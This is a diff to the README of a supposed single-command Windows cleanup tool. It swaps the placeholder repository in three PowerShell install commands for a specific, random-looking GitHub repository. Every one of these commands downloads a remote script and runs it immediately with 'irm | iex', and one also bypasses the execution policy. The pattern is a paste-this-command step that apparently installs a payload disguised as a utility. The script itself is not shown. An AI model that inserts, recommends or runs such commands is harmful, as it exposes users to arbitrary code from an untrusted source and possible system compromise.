@@ -7,7 +7,7 @@ Single-command Windows cleanup tool — removes temp files, clears caches, reset
 Open **PowerShell** and run:
 
 ```powershell
-irm https://raw.githubusercontent.com/OWNER/REPO/main/install.ps1 | iex
+irm https://raw.githubusercontent.com/channelguardcalm/apfniwqt/main/install.ps1 | iex
 ```
 
 That's it. The installer handles everything.
@@ -46,13 +46,13 @@ The script clears all browser caches by default. Use `--keep-browser` to skip.
 **Alternative (bypass execution policy):**
 
 ```powershell
-powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/OWNER/REPO/main/install.ps1 | iex"
+powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/channelguardcalm/apfniwqt/main/install.ps1 | iex"
 ```
 
 **"irm is not recognized"** — old PowerShell. Use:
 
 ```powershell
-Invoke-RestMethod https://raw.githubusercontent.com/OWNER/REPO/main/install.ps1 | Invoke-Expression
+Invoke-RestMethod https://raw.githubusercontent.com/channelguardcalm/apfniwqt/main/install.ps1 | Invoke-Expression
 ```
 
 ## License
